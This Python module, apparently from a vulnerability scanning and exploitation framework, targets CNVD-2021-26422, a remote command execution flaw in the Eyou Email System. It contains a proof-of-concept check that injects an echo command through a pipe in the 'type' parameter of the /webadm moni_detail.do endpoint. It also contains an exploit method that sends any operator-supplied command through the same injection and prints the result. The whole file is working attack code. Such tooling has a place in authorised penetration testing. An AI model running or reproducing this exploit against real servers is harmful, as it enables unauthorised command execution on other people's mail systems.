#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import threading
from thirdparty import requests
from module import globals
from core.verify import verify
from module.md5 import random_md5
from core.verify import misinformation
from thirdparty.requests_toolbelt.utils import dump
from thirdparty.requests.compat import urljoin


class Eyou():
    def __init__(self, url):
        self.url = url
        self.raw_data = None
        self.vul_info = {}
        self.ua = globals.get_value("UA")  # 获取全局变量UA
        self.timeout = globals.get_value("TIMEOUT")  # 获取全局变量UA
        self.headers = globals.get_value("HEADERS")  # 获取全局变量HEADERS
        self.threadLock = threading.Lock()

    def cnvd_2021_26422_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Eyou Email System: CNVD-2021-26422"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "Eyou email system has remote command execution"
        self.vul_info["vul_numb"] = "CNVD-2021-26422"
        self.vul_info["vul_apps"] = "Eyou"
        self.vul_info["vul_date"] = "2021-04-19"
        self.vul_info["vul_vers"] = "unknow"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "RCE"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "Eyou email system has remote command execution"
        self.vul_info["cre_date"] = "2021-04-29"
        self.vul_info["cre_auth"] = "zhzyker"
        url = urljoin(self.url, "/webadm/?q=moni_detail.do&action=gragh")
        md = random_md5()
        cmd = "echo " + md
        payload = "type='|" + cmd + "||'"
        try:
            request = requests.post(url, data=payload, headers=self.headers, timeout=self.timeout, verify=False)
            if md in misinformation(request.text, md):
                self.vul_info["vul_data"] = dump.dump_all(request).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["vul_payd"] = payload
                self.vul_info["prt_info"] = "[cmd:" + cmd + "]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as error:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def cnvd_2021_26422_exp(self, cmd):
        vul_name = "Eyou Email System: CNVD-2021-26422"
        url = urljoin(self.url, "/webadm/?q=moni_detail.do&action=gragh")
        payload = "type='|" + cmd + "||'"
        try:
            request = requests.post(url, data=payload, headers=self.headers, timeout=self.timeout, verify=False)
            self.raw_data = dump.dump_all(request).decode('utf-8', 'ignore')
            verify.exploit_print(request.text, self.raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)